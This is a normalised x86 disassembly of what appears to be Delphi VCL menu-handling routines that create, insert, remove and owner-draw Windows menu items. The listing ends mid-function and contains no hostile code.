mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45c194
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_459800
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45e130
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_45b830
test eax eax
jg r-xdata
mov edx esi
call sub_45bbc8
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_45b840
call sub_403128
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403128
lea eax [ esi + 0x44 ]
call sub_40d31c
lea eax [ esi + 0x78 ]
call sub_40d31c
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_459c1c
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_418c2c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420d84
test bl bl
jle r-xdata
call sub_403128
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4598b4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_459b0f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459b16
lea eax [ ebp - 0x40 ]
call sub_403eb8
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_403f50
mov eax ebx
call sub_45b830
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_459dc4
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4042c4
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_45b830
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_45bdec
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_458f18
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404238
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404378
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_404378
push eax
mov eax ebx
call sub_459dc4
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_45b408
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4042c4
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_404378
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_45b830
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_459dc4
mov [ ebp - 0x25 ] eax
sub_459b2f
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_4598b4
xor eax eax
pop ebp
retn
sub_459b54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_45d428
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45c3f0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45c8ec
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_4592f0
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_459bc4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_459c0e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41dcdc
mov eax [ ebp - 0x4 ]
call sub_459178
mov edx eax
mov eax ebx
call sub_45b864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459c15
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_459c1c
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_459c94
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_420e08
sub_459c58
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_421188
mov eax ebx
call sub_45b818
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_45b818
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403324
pop esi
pop ebx
retn
mov eax ebx
call sub_459c94
sub_459c94
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_459dc4
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_459c94
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_459dc4
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_459dc4
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_459b54
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebp
call sub_459dc4
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_459d64
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_45b830
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_45b840
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_45b840
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_45b840
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_458e6c
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_459dc4
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_459b54
mov eax [ rw-data ]
call sub_458e6c
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_459e10
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4210b0
push ebx
push sub_459bc4
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_459e54
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45a038
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45bdec
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403f50
test bh 0x4
je r-xdata
mov eax edi
call sub_45d428
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042c4
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424b54
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404180
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_42452c
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_424538
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a03f
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425280
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404178
push eax
mov eax [ ebp - 0xc ]
call sub_404378
push eax
mov eax [ ebp - 0x4 ]
call sub_425280
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_42426c
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404178
push eax
mov eax [ ebp - 0xc ]
call sub_404378
push eax
mov eax [ ebp - 0x4 ]
call sub_425280
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_42426c
mov eax 0xff00000d
call sub_423dac
mov esi eax
mov eax 0xff000010
call sub_423dac
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_42426c
jmp r-xdata
sub_45a0a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45a98c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424e6c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424a38
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_42426c
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042c4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424a38
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424e6c
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_456c40
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425280
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424a30
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424a38
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45a4eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42a64c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_42426c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_456c40
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424a38
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424e6c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424a30
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42b858
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424a0c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424e6c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424e6c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42503c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
